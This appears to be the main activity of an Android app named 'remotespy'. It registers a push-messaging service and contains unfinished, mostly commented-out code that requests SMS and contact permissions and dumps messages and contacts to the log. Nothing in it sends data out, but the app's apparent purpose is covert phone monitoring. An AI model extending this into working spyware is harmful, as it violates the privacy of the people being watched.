package org.dalol.remotespy;

import android.*;
import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import org.dalol.remotespy.services.GCMRegistrationIntentService;
import org.dalol.remotespy.utils.DeviceUtils;

import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = MainActivity.class.getSimpleName();
    private static final int REQUEST_PERMISSION_CODE = 111;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }

    @Override
    protected void onResume() {
        super.onResume();
        //checkPermission();

        if (DeviceUtils.checkPlayServices(this)) {
            Intent gcmIntent = new Intent(this, GCMRegistrationIntentService.class);
            startService(gcmIntent);
        }
    }

    private void checkPermission(){
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
                &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
            //dumpSMSMessages();
            Log.d(TAG, ""+new MessagesHelper().fetchContacts(this));
            //System.out.println(new MessagesHelper().fetchContacts(this));
        } else if (ActivityCompat.shouldShowRequestPermissionRationale(this, android.Manifest.permission.READ_SMS) ||
                ActivityCompat.shouldShowRequestPermissionRationale(this, android.Manifest.permission.READ_CONTACTS)) {

            showToast("Show explanation");
            ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_SMS, android.Manifest.permission.READ_CONTACTS}, REQUEST_PERMISSION_CODE);

        } else {
            ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_SMS, android.Manifest.permission.READ_CONTACTS}, REQUEST_PERMISSION_CODE);
        }
    }

    private void dumpSMSMessages() {
        System.out.println(new MessagesHelper().getAllSms(this));
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        switch (requestCode) {
            case REQUEST_PERMISSION_CODE:
//                if (permissions.length != 1 || grantResults.length != 1) {
//                    throw new RuntimeException(getString(R.string.error_camera_permission));
//                }
                if (grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                    showToast("Camera permission not granted");
                } else {
                    //dumpSMSMessages();
                }
                break;
        }
    }

    private void showToast(String message) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show();
    }
}
